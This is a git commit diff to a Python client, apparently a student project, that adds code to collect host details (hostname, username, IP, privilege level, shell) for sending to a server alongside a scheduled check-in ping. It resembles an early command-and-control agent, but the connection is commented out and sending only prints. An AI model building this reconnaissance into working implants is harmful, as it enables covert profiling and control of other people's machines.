95cb4223008e509bc3e48a5871262527559a620a
arogoff <asr8607@rit.edu>
2025-02-26 14:26:26 -0500

    shell for connecting to a server

--- client.py
+++ client.py
@@ -1,5 +1,9 @@
 #!/usr/bin/env python3
 import sched, time
+import socket
+import platform
+from datetime import datetime
+import os
 
 SERVER = "0.0.0.0"
 PORT = 1234
@@ -14,6 +18,52 @@ def ping(checkin_scheduler):
 
 def setup_connection():
     print("setup connection to server")
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        #sock.connect((SERVER, PORT))
+
+        sys_info = get_system_info()
+        send(sys_info)
+
+    except Exception as e:
+        print("error connecting")
+
+def get_system_info():
+    info = {
+            "session_id": 1234,
+            "hostname": socket.gethostname(),
+            "os": platform.system(),
+            "username": os.getenv("USER") or os.getenv("USERNAME"),
+            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "ip_address": socket.gethostbyname(socket.gethostname()),
+            "platform": platform.platform(),
+        }
+        
+    # OS-specific info
+    if platform.system() == "Windows":
+        try:
+            print("windows stuff here")
+        except Exception as e:
+            pass
+    else:  # Linux/Unix
+        try:
+            info["privileges"] = "root" if os.geteuid() == 0 else "user"
+            info["shell"] = os.getenv("SHELL")
+        except Exception as e:
+            pass
+                
+    return info
+
+def send(data):
+    print("sending data")
+    print(data)
+
+def recieve():
+    print("recieving data")
+
+
+
+setup_connection()
 
 # creates scheduler to ping server
 checkin_scheduler = sched.scheduler(time.time, time.sleep)
